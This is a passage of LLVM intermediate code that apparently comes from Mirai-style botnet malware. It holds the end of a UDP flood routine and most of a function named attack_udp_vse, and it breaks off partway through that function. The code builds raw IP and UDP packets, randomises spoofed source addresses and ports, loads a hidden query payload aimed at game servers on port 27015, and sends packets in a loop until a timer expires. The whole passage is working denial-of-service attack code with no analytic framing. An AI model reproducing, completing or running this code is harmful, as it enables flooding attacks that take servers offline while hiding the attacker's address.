  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %80

; <label>:80:                                     ; preds = %79, %5
  %81 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %81, i32* %12, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %80
  br label %330

; <label>:84:                                     ; preds = %80
  store i32 1, i32* %11, align 4
  %85 = load i32, i32* %12, align 4
  %86 = bitcast i32* %11 to i8*
  %87 = call i32 @setsockopt(i32 %85, i32 0, i32 3, i8* %86, i32 4) #6
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %92

; <label>:89:                                     ; preds = %84
  %90 = load i32, i32* %12, align 4
  %91 = call i32 @close(i32 %90)
  br label %330

; <label>:92:                                     ; preds = %84
  store i32 0, i32* %11, align 4
  br label %93

; <label>:93:                                     ; preds = %175, %92
  %94 = load i32, i32* %11, align 4
  %95 = load i8, i8* %7, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp slt i32 %94, %96
  br i1 %97, label %98, label %178

; <label>:98:                                     ; preds = %93
  %99 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %100 = load i8**, i8*** %13, align 8
  %101 = load i32, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8*, i8** %100, i64 %102
  store i8* %99, i8** %103, align 8
  %104 = load i8**, i8*** %13, align 8
  %105 = load i32, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %104, i64 %106
  %108 = load i8*, i8** %107, align 8
  %109 = bitcast i8* %108 to %struct.iphdr*
  store %struct.iphdr* %109, %struct.iphdr** %24, align 8
  %110 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i64 1
  %112 = bitcast %struct.iphdr* %111 to %struct.udphdr*
  store %struct.udphdr* %112, %struct.udphdr** %25, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = and i8 %115, 15
  %117 = or i8 %116, 64
  store i8 %117, i8* %114, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %119 = bitcast %struct.iphdr* %118 to i8*
  %120 = load i8, i8* %119, align 4
  %121 = and i8 %120, -16
  %122 = or i8 %121, 5
  store i8 %122, i8* %119, align 4
  %123 = load i8, i8* %14, align 1
  %124 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 1
  store i8 %123, i8* %125, align 1
  %126 = load i16, i16* %20, align 2
  %127 = zext i16 %126 to i64
  %128 = add i64 28, %127
  %129 = trunc i64 %128 to i16
  %130 = call zeroext i16 @htons(i16 zeroext %129) #7
  %131 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 2
  store i16 %130, i16* %132, align 2
  %133 = load i16, i16* %15, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 3
  store i16 %134, i16* %136, align 4
  %137 = load i8, i8* %16, align 1
  %138 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 5
  store i8 %137, i8* %139, align 4
  %140 = load i8, i8* %17, align 1
  %141 = icmp ne i8 %140, 0
  br i1 %141, label %142, label %146

; <label>:142:                                    ; preds = %98
  %143 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %144 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 4
  store i16 %143, i16* %145, align 2
  br label %146

; <label>:146:                                    ; preds = %142, %98
  %147 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 6
  store i8 17, i8* %148, align 1
  %149 = load i32, i32* %22, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 8
  store i32 %149, i32* %151, align 4
  %152 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %153 = load i32, i32* %11, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 9
  store i32 %157, i32* %159, align 4
  %160 = load i16, i16* %18, align 2
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %163 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %162, i32 0, i32 0
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %19, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load i16, i16* %20, align 2
  %169 = zext i16 %168 to i64
  %170 = add i64 8, %169
  %171 = trunc i64 %170 to i16
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %174 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  br label %175

; <label>:175:                                    ; preds = %146
  %176 = load i32, i32* %11, align 4
  %177 = add nsw i32 %176, 1
  store i32 %177, i32* %11, align 4
  br label %93

; <label>:178:                                    ; preds = %93
  br label %179

; <label>:179:                                    ; preds = %329, %178
  store i32 0, i32* %11, align 4
  br label %180

; <label>:180:                                    ; preds = %320, %179
  %181 = load i32, i32* %11, align 4
  %182 = load i8, i8* %7, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp slt i32 %181, %183
  br i1 %184, label %185, label %323

; <label>:185:                                    ; preds = %180
  %186 = load i8**, i8*** %13, align 8
  %187 = load i32, i32* %11, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  %190 = load i8*, i8** %189, align 8
  store i8* %190, i8** %26, align 8
  %191 = load i8*, i8** %26, align 8
  %192 = bitcast i8* %191 to %struct.iphdr*
  store %struct.iphdr* %192, %struct.iphdr** %27, align 8
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i64 1
  %195 = bitcast %struct.iphdr* %194 to %struct.udphdr*
  store %struct.udphdr* %195, %struct.udphdr** %28, align 8
  %196 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i64 1
  %198 = bitcast %struct.udphdr* %197 to i8*
  store i8* %198, i8** %29, align 8
  %199 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %200 = load i32, i32* %11, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 2
  %204 = load i8, i8* %203, align 4
  %205 = zext i8 %204 to i32
  %206 = icmp slt i32 %205, 32
  br i1 %206, label %207, label %228

; <label>:207:                                    ; preds = %185
  %208 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %209 = load i32, i32* %11, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 1
  %213 = load i32, i32* %212, align 4
  %214 = call i32 @ntohl(i32 %213) #7
  %215 = call i32 @rand_next()
  %216 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %217 = load i32, i32* %11, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i32 0, i32 2
  %221 = load i8, i8* %220, align 4
  %222 = zext i8 %221 to i32
  %223 = lshr i32 %215, %222
  %224 = add i32 %214, %223
  %225 = call i32 @htonl(i32 %224) #7
  %226 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %207, %185
  %229 = load i32, i32* %22, align 4
  %230 = icmp eq i32 %229, -1
  br i1 %230, label %231, label %235

; <label>:231:                                    ; preds = %228
  %232 = call i32 @rand_next()
  %233 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  br label %235

; <label>:235:                                    ; preds = %231, %228
  %236 = load i16, i16* %15, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  br i1 %238, label %239, label %244

; <label>:239:                                    ; preds = %235
  %240 = call i32 @rand_next()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 3
  store i16 %241, i16* %243, align 4
  br label %244

; <label>:244:                                    ; preds = %239, %235
  %245 = load i16, i16* %18, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %246, 65535
  br i1 %247, label %248, label %253

; <label>:248:                                    ; preds = %244
  %249 = call i32 @rand_next()
  %250 = trunc i32 %249 to i16
  %251 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 0
  store i16 %250, i16* %252, align 2
  br label %253

; <label>:253:                                    ; preds = %248, %244
  %254 = load i16, i16* %19, align 2
  %255 = zext i16 %254 to i32
  %256 = icmp eq i32 %255, 65535
  br i1 %256, label %257, label %262

; <label>:257:                                    ; preds = %253
  %258 = call i32 @rand_next()
  %259 = trunc i32 %258 to i16
  %260 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 1
  store i16 %259, i16* %261, align 2
  br label %262

; <label>:262:                                    ; preds = %257, %253
  %263 = load i8, i8* %21, align 1
  %264 = icmp ne i8 %263, 0
  br i1 %264, label %265, label %273

; <label>:265:                                    ; preds = %262
  %266 = load i8*, i8** %29, align 8
  %267 = load i16, i16* %20, align 2
  %268 = zext i16 %267 to i32
  call void @rand_alpha_str(i8* %266, i32 %268)
  %269 = load i8*, i8** %29, align 8
  %270 = load i16, i16* %20, align 2
  %271 = zext i16 %270 to i64
  %272 = getelementptr inbounds i8, i8* %269, i64 %271
  store i8 0, i8* %272, align 1
  br label %273

; <label>:273:                                    ; preds = %265, %262
  %274 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 0, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %277 = bitcast %struct.iphdr* %276 to i16*
  %278 = call zeroext i16 @checksum_generic(i16* %277, i32 20)
  %279 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %285 = bitcast %struct.udphdr* %284 to i8*
  %286 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 2
  %288 = load i16, i16* %287, align 2
  %289 = load i16, i16* %20, align 2
  %290 = zext i16 %289 to i64
  %291 = add i64 8, %290
  %292 = trunc i64 %291 to i32
  %293 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %288, i32 %292)
  %294 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 2
  %296 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %300 = load i32, i32* %11, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %303, i32 0, i32 1
  store i16 %298, i16* %304, align 2
  %305 = load i32, i32* %12, align 4
  %306 = load i8*, i8** %26, align 8
  %307 = load i16, i16* %20, align 2
  %308 = zext i16 %307 to i64
  %309 = add i64 28, %308
  %310 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %311 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %312 = load i32, i32* %11, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = bitcast %struct.sockaddr_in* %315 to %struct.sockaddr*
  store %struct.sockaddr* %316, %struct.sockaddr** %310, align 8
  %317 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %318 = load %struct.sockaddr*, %struct.sockaddr** %317, align 8
  %319 = call i64 @sendto(i32 %305, i8* %306, i64 %309, i32 16384, %struct.sockaddr* %318, i32 16)
  br label %320

; <label>:320:                                    ; preds = %273
  %321 = load i32, i32* %11, align 4
  %322 = add nsw i32 %321, 1
  store i32 %322, i32* %11, align 4
  br label %180

; <label>:323:                                    ; preds = %180
  %324 = call i64 @time(i64* null) #6
  %325 = load i32, i32* %23, align 4
  %326 = sext i32 %325 to i64
  %327 = icmp sgt i64 %324, %326
  br i1 %327, label %328, label %329

; <label>:328:                                    ; preds = %323
  br label %330

; <label>:329:                                    ; preds = %323
  br label %179

; <label>:330:                                    ; preds = %328, %89, %83
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 40)
  %63 = call i8* @table_retrieve_val(i32 40, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %12, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %5
  br label %302

; <label>:67:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %68 = load i32, i32* %12, align 4
  %69 = bitcast i32* %11 to i8*
  %70 = call i32 @setsockopt(i32 %68, i32 0, i32 3, i8* %69, i32 4) #6
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %75

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* %12, align 4
  %74 = call i32 @close(i32 %73)
  br label %302

; <label>:75:                                     ; preds = %67
  store i32 0, i32* %11, align 4
  br label %76

; <label>:76:                                     ; preds = %168, %75
  %77 = load i32, i32* %11, align 4
  %78 = load i8, i8* %7, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %171

; <label>:81:                                     ; preds = %76
  %82 = call noalias i8* @calloc(i64 128, i64 1) #6
  %83 = load i8**, i8*** %13, align 8
  %84 = load i32, i32* %11, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8*, i8** %83, i64 %85
  store i8* %82, i8** %86, align 8
  %87 = load i8**, i8*** %13, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8*, i8** %87, i64 %89
  %91 = load i8*, i8** %90, align 8
  %92 = bitcast i8* %91 to %struct.iphdr*
  store %struct.iphdr* %92, %struct.iphdr** %23, align 8
  %93 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i64 1
  %95 = bitcast %struct.iphdr* %94 to %struct.udphdr*
  store %struct.udphdr* %95, %struct.udphdr** %24, align 8
  %96 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %97 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %96, i64 1
  %98 = bitcast %struct.udphdr* %97 to i8*
  store i8* %98, i8** %25, align 8
  %99 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = load i8, i8* %100, align 4
  %102 = and i8 %101, 15
  %103 = or i8 %102, 64
  store i8 %103, i8* %100, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %105 = bitcast %struct.iphdr* %104 to i8*
  %106 = load i8, i8* %105, align 4
  %107 = and i8 %106, -16
  %108 = or i8 %107, 5
  store i8 %108, i8* %105, align 4
  %109 = load i8, i8* %14, align 1
  %110 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 1
  store i8 %109, i8* %111, align 1
  %112 = load i32, i32* %21, align 4
  %113 = sext i32 %112 to i64
  %114 = add i64 32, %113
  %115 = trunc i64 %114 to i16
  %116 = call zeroext i16 @htons(i16 zeroext %115) #7
  %117 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i32 0, i32 2
  store i16 %116, i16* %118, align 2
  %119 = load i16, i16* %15, align 2
  %120 = call zeroext i16 @htons(i16 zeroext %119) #7
  %121 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i32 0, i32 3
  store i16 %120, i16* %122, align 4
  %123 = load i8, i8* %16, align 1
  %124 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 5
  store i8 %123, i8* %125, align 4
  %126 = load i8, i8* %17, align 1
  %127 = icmp ne i8 %126, 0
  br i1 %127, label %128, label %132

; <label>:128:                                    ; preds = %81
  %129 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %130 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 4
  store i16 %129, i16* %131, align 2
  br label %132

; <label>:132:                                    ; preds = %128, %81
  %133 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 6
  store i8 17, i8* %134, align 1
  %135 = load i32, i32* @LOCAL_ADDR, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 8
  store i32 %135, i32* %137, align 4
  %138 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %139 = load i32, i32* %11, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i64 %140
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i32 0, i32 1
  %143 = load i32, i32* %142, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 9
  store i32 %143, i32* %145, align 4
  %146 = load i16, i16* %18, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 0
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %19, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %153 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %152, i32 0, i32 1
  store i16 %151, i16* %153, align 2
  %154 = load i32, i32* %21, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 12, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i8*, i8** %25, align 8
  %162 = bitcast i8* %161 to i32*
  store i32 -1, i32* %162, align 4
  %163 = load i8*, i8** %25, align 8
  %164 = getelementptr inbounds i8, i8* %163, i64 4
  store i8* %164, i8** %25, align 8
  %165 = load i8*, i8** %25, align 8
  %166 = load i8*, i8** %20, align 8
  %167 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %165, i8* %166, i32 %167)
  br label %168

; <label>:168:                                    ; preds = %132
  %169 = load i32, i32* %11, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %11, align 4
  br label %76

; <label>:171:                                    ; preds = %76
  br label %172

; <label>:172:                                    ; preds = %301, %171
  store i32 0, i32* %11, align 4
  br label %173

; <label>:173:                                    ; preds = %292, %172
  %174 = load i32, i32* %11, align 4
  %175 = load i8, i8* %7, align 1
  %176 = zext i8 %175 to i32
  %177 = icmp slt i32 %174, %176
  br i1 %177, label %178, label %295

; <label>:178:                                    ; preds = %173
  %179 = load i8**, i8*** %13, align 8
  %180 = load i32, i32* %11, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8*, i8** %179, i64 %181
  %183 = load i8*, i8** %182, align 8
  store i8* %183, i8** %26, align 8
  %184 = load i8*, i8** %26, align 8
  %185 = bitcast i8* %184 to %struct.iphdr*
  store %struct.iphdr* %185, %struct.iphdr** %27, align 8
  %186 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i64 1
  %188 = bitcast %struct.iphdr* %187 to %struct.udphdr*
  store %struct.udphdr* %188, %struct.udphdr** %28, align 8
  %189 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 2
  %194 = load i8, i8* %193, align 4
  %195 = zext i8 %194 to i32
  %196 = icmp slt i32 %195, 32
  br i1 %196, label %197, label %218

; <label>:197:                                    ; preds = %178
  %198 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %199 = load i32, i32* %11, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = call i32 @ntohl(i32 %203) #7
  %205 = call i32 @rand_next()
  %206 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %207 = load i32, i32* %11, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 2
  %211 = load i8, i8* %210, align 4
  %212 = zext i8 %211 to i32
  %213 = lshr i32 %205, %212
  %214 = add i32 %204, %213
  %215 = call i32 @htonl(i32 %214) #7
  %216 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 9
  store i32 %215, i32* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %197, %178
  %219 = load i16, i16* %15, align 2
  %220 = zext i16 %219 to i32
  %221 = icmp eq i32 %220, 65535
  br i1 %221, label %222, label %227

; <label>:222:                                    ; preds = %218
  %223 = call i32 @rand_next()
  %224 = trunc i32 %223 to i16
  %225 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 3
  store i16 %224, i16* %226, align 4
  br label %227

